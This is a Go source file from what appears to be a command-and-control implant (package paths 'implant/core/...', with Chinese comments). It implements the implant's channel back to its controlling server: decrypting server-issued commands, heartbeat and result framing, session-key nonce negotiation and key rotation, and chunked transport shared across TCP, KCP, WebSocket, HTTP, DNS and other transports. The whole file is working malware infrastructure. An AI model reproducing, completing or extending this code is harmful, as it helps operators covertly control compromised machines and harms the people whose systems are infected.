package communication

import (
	"encoding/binary"
	"fmt"
	"implant/core/encrypt"
	"implant/core/debuglog"
	"implant/core/utils"
	"io"
)

// DecryptCommand 解密服务端下发命令（会话密钥优先，失败回落旧双重加密）。
// 【后续】加密体系改造移除旧加密后，仅需修改此函数，12 个 transport 无需改动。
func DecryptCommand(rawData []byte) ([]byte, error) {
	// 【加密体系改造】会话密钥解密失败直接报错，不再回落旧加密
	return encrypt.DecryptWithSessionKey(rawData)
}

// FrameResult 构造结果帧: normalData(2) | MetaLen | MetaInfo | b64Packet。
// 适用于 TCP/KCP/forward/WS 等持帧协议；HTTP/OSS/DNS 的轮询适配器按各自封装。
func FrameResult(b64Packet []byte) []byte {
	return utils.BytesCombine(utils.WriteInt(len(utils.MetaInfo)), utils.MetaInfo, b64Packet)
}

// HeartbeatMsg 构造心跳消息: type=3 | MetaInfo
func HeartbeatMsg() []byte {
	return utils.BytesCombine(utils.WriteInt(3), utils.MetaInfo)
}

// IsHeartbeatAck 判断解密后的命令是否为心跳 ack（type=3 空载荷）：
// 仅存活探测，非业务命令，应丢弃。
func IsHeartbeatAck(decrypted []byte) bool {
	return len(decrypted) == 4 && decrypted[0] == 0 && decrypted[1] == 0 &&
		decrypted[2] == 0 && decrypted[3] == 3
}

// SessionNonceMsgType 会话密钥协商消息类型（服务端→客户端，携带每连接随机 nonce）
const SessionNonceMsgType = 4

// KeyRotationMsgType 密钥轮换消息类型（服务端→客户端，携带轮换 nonce(16B)）
const KeyRotationMsgType = 5

// KeyRotateAckReplyType 密钥轮换确认回包类型（客户端→服务端，空载荷）
const KeyRotateAckReplyType = 121

// ConsumeSessionNonce 消费会话密钥协商/轮换消息：
//   - type=4（4|nonce(16)）：用 nonce 重派生会话密钥（唯一化）并返回 (nil, nil)
//   - type=5（5|nonce(16)）：密钥轮换——同公式重派生并回 ACK（KeyRotateAckReplyType，
//     用新密钥加密，服务端经 NextKey 解密验证后提升）并返回 (nil, nil)
//
// 其他消息原样返回。
func ConsumeSessionNonce(decrypted []byte) ([]byte, error) {
	if len(decrypted) >= 20 {
		msgType := binary.BigEndian.Uint32(decrypted[:4])
		if msgType == SessionNonceMsgType || msgType == KeyRotationMsgType {
			nonce := decrypted[4:20]
			if err := encrypt.GlobalClientKeyManager.SetSessionKeyWithNonce(nonce); err != nil {
				return nil, err
			}
			if msgType == KeyRotationMsgType {
				// P3-1: 回轮换确认（新密钥已生效，经 SendResult 加密回传）
				criticalSection(KeyRotateAckReplyType, nil)
				debuglog.Printf("🔑 [CLIENT] 密钥轮换已确认，回送 ACK\n")
			}
			return nil, nil
		}
	}
	return decrypted, nil
}

// ============ P2-5: 分帧传输共享管线（TCP/KCP/forward 系列复用，消除 6 处复制粘贴） ============

// MaxMessageSize 单条命令消息大小上限（K3）：恶意/被攻陷服务端可下发超长长度
// 前缀触发 make() OOM 崩溃植入体；超限由调用方断连重连。
const MaxMessageSize = 512 * 1024 * 1024

// ReadFramedLength 读取 4 字节大端长度前缀。
// 返回 0 表示空帧（total==0，调用方按 nil 命令处理）；超上限返回错误。
func ReadFramedLength(r io.Reader) (uint32, error) {
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(r, lenBuf); err != nil {
		return 0, err
	}
	total := binary.BigEndian.Uint32(lenBuf)
	if total == 0 {
		return 0, nil
	}
	if total > MaxMessageSize {
		return 0, fmt.Errorf("消息长度超限: %d", total)
	}
	return total, nil
}

// ReadFramedPayload 读取 total 字节帧载荷（total 须已通过 ReadFramedLength 校验）。
func ReadFramedPayload(r io.Reader, total uint32) ([]byte, error) {
	payload := make([]byte, total)
	if _, err := io.ReadFull(r, payload); err != nil {
		return nil, err
	}
	return payload, nil
}

// DecodeFramePayload 帧载荷处理管线：base64 解码 → 会话密钥解密 →
// nonce 协商消息消费（唯一化/轮换）→ 心跳 ack 过滤。
// 返回 nil 表示非业务命令（nonce 协商已处理 / 心跳 ack），调用方丢弃即可。
func DecodeFramePayload(payload []byte) ([]byte, error) {
	rawData, err := encrypt.DecodeBase64(payload)
	if err != nil {
		return nil, err
	}
	decrypted, err := DecryptCommand(rawData)
	if err != nil {
		return nil, err
	}
	// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4/5），重派生会话密钥
	if decrypted, err = ConsumeSessionNonce(decrypted); err != nil {
		return nil, err
	}
	if decrypted == nil {
		return nil, nil
	}
	// 心跳 ack（type=3 空载荷）：仅存活探测，非命令，丢弃
	if IsHeartbeatAck(decrypted) {
		return nil, nil
	}
	return decrypted, nil
}

// WriteChunked 分块写入（50KB/块），避免一次性 Write 超大帧。
func WriteChunked(w io.Writer, data []byte) error {
	const chunkSize = 50 * 1024
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		if _, err := w.Write(data[i:end]); err != nil {
			return err
		}
	}
	return nil
}
